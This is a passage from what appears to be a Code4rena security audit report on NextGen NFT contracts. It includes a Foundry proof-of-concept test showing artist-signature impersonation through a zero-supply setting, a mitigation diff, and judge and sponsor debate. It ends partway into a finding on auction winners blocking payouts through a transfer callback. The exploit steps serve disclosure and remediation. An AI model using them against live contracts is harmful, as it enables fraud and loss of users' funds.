class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collectionId</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fakeArtist</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collectionAdmin</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maxCollectionPurchases</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">10</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">zeroSupply</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// Supply = 0 allows this attack</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">setFinalSupplyTimeAfterMint</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">30</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// The collection admin sets the initial collection data with a fake artist</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collectionAdmin</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gencore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setCollectionData</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">collectionId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">fakeArtist</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">maxCollectionPurchases</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">zeroSupply</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">setFinalSupplyTimeAfterMint</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Then uses the fake artist address to sign a message impersonating a legit artist</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fakeSignature</span><span class=\"mtk1\"> = </span><span class=\"mtk8\">&quot;I am the Legit Artist Behind CryptoPunks. This is my signature.&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">fakeArtist</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gencore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">artistSignature</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collectionId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">fakeSignature</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">legitArtist</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">makeAddr</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;legitArtist&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">realTotalSupply</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1000</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Finally sets the &quot;initial&quot; collection data again, but with the legit artist address and the real total supply</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collectionAdmin</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gencore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setCollectionData</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">collectionId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">legitArtist</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">maxCollectionPurchases</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">realTotalSupply</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">setFinalSupplyTimeAfterMint</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// The result is a collection impersonating a legit address, with a fake signature as a proof</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gencore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">retrieveArtistAddress</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collectionId</span><span class=\"mtk1\">), </span><span class=\"mtk12\">legitArtist</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gencore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">artistsSignatures</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collectionId</span><span class=\"mtk1\">), </span><span class=\"mtk12\">fakeSignature</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>One way to prevent this is by checking that the collection total supply is set to a value <code>> 0</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"30\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function setCollectionData(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint256 _collectionID,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        address _collectionArtistAddress,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint256 _maxCollectionPurchases,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint256 _collectionTotalSupply,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint _setFinalSupplyTimeAfterMint</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) public CollectionAdminRequired(_collectionID, this.setCollectionData.selector) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        require(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            (isCollectionCreated[_collectionID] == true) &amp;&amp; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            (collectionFreeze[_collectionID] == false) &amp;&amp; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+           (_collectionTotalSupply &gt; 0)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            (_collectionTotalSupply &lt;= 10000000000</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ), &quot;err/freezed&quot;);</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/741#issuecomment-1843091896\">0xsomeone (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden specifies a potential attack path in the artist configuration of a collection by weaponizing the absence of an input sanitization for the <code>_collectionTotalSupply</code> argument.</p>\n<p>Specifically, they envision the following scenario:</p>\n<ul>\n<li>A collection is initialized with an artist <strong>but a zero <code>_collectionTotalSupply</code> value</strong>.</li>\n<li>An artist signs the collection (this is permitted by <code>artistSignature</code>).</li>\n<li>A collection is re-initialized as the <code>if</code> structure enters the first conditional, this time with a non-zero collection supply and a different artist.</li>\n</ul>\n<p>At this point, the collection will have a different artist than the one that signed the collection which breaks an invariant of the protocol and is incorrect behavior.</p>\n<p>The Sponsor disputes this submission, but I invite them to re-consider the above step-by-step scenario which is presently possible in the codebase.</p>\n<p>I believe that a medium-risk rating for this is correct, as the artist associated with a collection is crucial to the collectionâ€™s value, and a collection will appear â€œsignedâ€ even if the artist did not sign it.</p>\n<p>The Wardenâ€™s submission was selected as the best due to pinpointing the exact problem in the codebase, outlining a step-by-step scenario via which it can be exploited, and assigning it an apt risk rating.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/741#issuecomment-1844559910\">a2rocket (NextGen) disputed and commented</a>:</strong></p>\n<blockquote>\n<p>NextGen admins are responsible for setting up a collection. The steps are <a href=\"https://seize-io.gitbook.io/nextgen/nextgen-smart-contracts/getting-started\">here</a>.</p>\n<p>No one can sign a collection besides the address that was set during step 2, so the statement that anyone can impersonate artist is totally wrong!</p>\n<p>The collection is deemed finalized when a <code>totalSupply</code> is set! Once a <code>totalsupply</code> is set and the artist did not sign, the address of the artist can change. Once the artist signs the collection the signature cannot change. This is the process. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/741#issuecomment-1848593029\">MrPotatoMagic (warden) commented</a>:</strong></p>\n<blockquote>\n<p>@0xsomeone, this issue should be marked QA at most or even invalid imo. Here is why:</p>\n<ol>\n<li>In the follow-up feedback from the sponsor above, @a2rocket clearly mentions NextGen admins are responsible for setting up a collection. This means not anyone can just create a collection and launch this attack since it requires the NextGen teamâ€™s trust in a set of people.</li>\n<li>Even after the filtering process by the NextGen team, the signature can never be forged because on the blockchain you can clearly see who signed the transaction i.e. the call to <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L258\">artistSignature()</a>, which can only be made by the current address set for the collection.</li>\n<li>Forgery of signature would only make sense for legal purposes and the proof of who signed <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L258\">artistSignature()</a> is present on the Ethereum blockchain.</li>\n<li>If a collection turns out to be malicious, the NextGen team can just warn users and remove that specific collection from their frontend.</li>\n</ol>\n<p>Due to all of these reasons, this issue should be QA or invalid.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/741#issuecomment-1848645283\">0xsomeone (judge) commented</a>:</strong></p>\n<blockquote>\n<p>@MrPotatoMagic, thanks for providing feedback on this! The submission has been graded as medium in severity due to breaking a core invariant of the protocol, which is that when an artist is associated with a particular collection and has signed it it cannot be altered.</p>\n<ol>\n<li>The response by the Sponsor concerning NextGen administrators <strong>is invalid</strong>. You can evaluate the code yourself and see <strong>that the collection administrator can independently perform these actions with no input from the administrative team of NextGen</strong>.</li>\n<li>The signature is forced because there is no obligation to provide any form of data in the <code>artistSignature</code> call. Yes, anyone can go on-chain and see when the <code>artistSignature</code> was invoked using off-chain tracking tools but that does not correspond to the on-chain data reality. The on-chain data says that the collection has been signed by an artist who never did so, and this is an irreversible change <strong>even by administrators</strong>.</li>\n<li>See #2 above.</li>\n<li>This is invalid reasoning as the same principle could apply to a wide variety of submissions in this context. </li>\n</ol>\n<p><strong>Conclusion</strong> - A core invariant of the protocol has been demonstrated to be possible to break <strong>with no input by the NextGen administrators whatsoever</strong>. Additionally, <strong>this invariant is irreversibly broken</strong> and cannot be rescued even by administrative action.</p>\n<p>As such, I retain my judgment on this submission as being of medium-risk severity.</p>\n</blockquote>\n<p><em>Note: For full discussion, see <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/741\">here</a>.</em></p>\n<hr>\n<h2 id=\"m-07-auction-winner-can-prevent-payments-via-safetransferfrom-callback\" style=\"position:relative;\"><a href=\"#m-07-auction-winner-can-prevent-payments-via-safetransferfrom-callback\" aria-label=\"m 07 auction winner can prevent payments via safetransferfrom callback permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/739\">[M-07] Auction winner can prevent payments via <code>safeTransferFrom</code> callback</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/739\">The_Kakers</a>, also found by <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1759\">Madalad</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1713\">immeas</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1590\">DeFiHackLabs</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1579\">Neon2835</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1545\">xeros</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1406\">Bauchibred</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1023\">fibonacci</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/997\">00decree</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/937\">SpicyMeatball</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/793\">ChrisTina</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/464\">Haipls</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/368\">_eperezok</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/242\">bdmcbri</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1925\">alexxander</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1750\">0xarno</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1736\">tnquanghuy0512</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1653\">Ocean_Sky</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1422\">spark</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1372\">Talfao</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1352\">r0ck3tz</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1267\">Arabadzhiev</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1230\">Tricko</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1214\">00xSEV</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1196\">Jiamin</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1167\">nuthan2x</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1143\">lsaudit</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1112\">cu5t0mpeo</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1075\">0x_6a70</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1071\">bronze_pickaxe</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1041\">circlelooper</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1032\">rotcivegaf</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1020\">Nyx</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/903\">KupiaSec</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/859\">Delvir0</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/811\">BugsFinder0x</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/776\">crunch</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/752\">ke1caM</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/683\">twcctop</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/642\">Juntao</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/612\">0xJuda</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/565\">amaechieth</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/532\">0xpiken</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/467\">funkornaut</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/386\">0x180db</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/366\">Taylor_Webb</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/181\">BugzyVonBuggernaut</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/176\">HChang26</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/155\">ZdravkoHr</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/122\">Timenov</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/81\">dimulski</a>, and <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/63\">0x3b</a></em></p>\n<p>An auction winner can decide to conditionally revert the <code>claimAuction()</code> execution.</p>\n<p>This leads to the following impacts:</p>\n<ul>\n<li>Other bidders canâ€™t get their funds back</li>\n<li>The protocol doesnâ€™t receive the funds from the winning bid</li>\n</ul>\n<p>This can lead to permanent loss of funds if the adversary decides to. As a drawback, they canâ€™t get the NFT.</p>\n<p>But nevertheless, they can use their control over the function to ask for a ransom, as the sum of other bids, plus the protocol earnings can be higher than the maximum bid itself and the damaged public image of the protocol for losing users funds.</p>\n<p>It also breaks one of the <a href=\"https://github.com/code-423n4/2023-10-nextgen#main-invariants\">main invariants of the protocol</a>:</p>\n<blockquote>\n<p>Properties that should NEVER be broken under any circumstance:</p>\n<ul>\n<li>The highest bidder will receive the token after an auction finishes, <strong>the owner of the token will receive the funds</strong> and <strong>all other participants will get refunded</strong>.</li>\n</ul>\n</blockquote>\n<p>Evaluated as Medium, as despite of the possibility of permanent assets lost, and breaking a main invariant, the adversary will have to take a loss as well; or persuade the participants via a ransom.</p>\n<h3 id=\"proof-of-concept-9\" style=\"position:relative;\"><a href=\"#proof-of-concept-9\" aria-label=\"proof of concept 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><code>claimAuction()</code> transfers the NFT using <code>safeTransferFrom()</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"31\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">claimAuction</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">WinnerOrAdminRequired</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">,this.claimAuction.selector){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">/// ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt; </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">].</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> ++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bidder</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">highestBidder</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bid</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">highestBid</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">status</span><span class=\"mtk1\"> == </span><span class=\"mtk4\">true</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">-&gt;              </span><span class=\"mtk11\">IERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gencore</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ownerOfToken</span><span class=\"mtk1\">, </span><span class=\"mtk12\">highestBidder</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// @audit adversary can make it revert</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">-&gt;              (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk11\">owner</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">highestBid</span><span class=\"mtk1\">}(</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// @audit funds not transferred</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ClaimAuction</span><span class=\"mtk1\">(</span><span class=\"mtk11\">owner</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">, </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, </span><span class=\"mtk12\">highestBid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">status</span><span class=\"mtk1\"> == </span><span class=\"mtk4\">true</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">-&gt;                (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bidder</span><span class=\"mtk1\">).</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bid</span><span class=\"mtk1\">}(</span><span 